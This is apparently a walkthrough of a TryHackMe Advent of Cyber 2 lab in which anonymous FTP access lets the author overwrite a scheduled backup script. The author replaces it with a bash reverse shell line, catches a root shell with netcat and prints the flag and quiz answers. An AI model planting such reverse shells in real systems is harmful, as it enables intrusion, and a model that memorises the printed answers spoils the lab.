# TRYHACKME: ADVENTOFCYBER2 [DAY 9] NETWORKING - Anyone can be Santa!

```
Even Santa has been having to adopt the "work from home" ethic in 2020. To help Santa out, Elf McSkidy and their team created a file server for The Best Festival Company (TBFC) that uses the FTP protocol. However, an attacker was able to hack this new server. Your mission, should you choose to accept it, is to understand how this hack occurred and to retrace the steps of the attacker.
```

TOPICS: Anonymous FTP, Bash reverse shell

### QUESTIONS

Name the directory on the FTP server that has data accessible by the "anonymous" user

```
$ ftp 10.10.37.103                                                                                         130 ⨯
Connected to 10.10.37.103.
220 Welcome to the TBFC FTP Server!.
Name (10.10.37.103:ffb): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/" is the current directory
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups
drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources
drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public

public
```

What script gets executed within this directory?

```
ftp> ls public
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 111      113           341 Nov 16 19:34 backup.sh
-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt
226 Directory send OK.

backup.sh
```

What movie did Santa have on his Christmas shopping list?

```
$ cat shoppinglist.txt 
The Polar Express Movie
```

Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!  Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.

```
$ cat backup.sh       
#!/bin/bash

# Created by ElfMcEager to backup all of Santa's goodies!

# Create backups to include date DD/MM/YYYY
# filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
# tar -zcvf /home/elfmceager/$filename /opt/ftp

# TO-DO: Automate transfer of backups to backup server

bash -i >& /dev/tcp/10.10.37.103/4444 0>&1
```

```
$ sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.44.43] from (UNKNOWN) [10.10.37.103] 49180
bash: cannot set terminal process group (1291): Inappropriate ioctl for device
bash: no job control in this shell
root@tbfc-ftp-01:~# 
root@tbfc-ftp-01:~# cat /root/flag.txt
cat /root/flag.txt
THM{even_you_can_be_santa}
```
